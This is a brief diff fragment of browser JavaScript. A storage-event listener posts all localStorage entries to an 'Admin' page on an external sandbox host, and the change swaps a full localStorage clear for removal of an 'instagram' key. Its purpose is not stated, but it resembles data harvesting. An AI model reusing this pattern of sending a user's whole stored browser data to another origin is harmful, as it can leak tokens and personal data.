@@ -33,7 +33,7 @@
       }
       window.addEventListener('storage', () => { 
          window_ref.postMessage(Object.entries(localStorage),"https://sandbox.bg.nc/ilian1/Admin/index.html")
-         localStorage.clear();
+         localStorage.removeItem("instagram");
          window.close()
       })
 
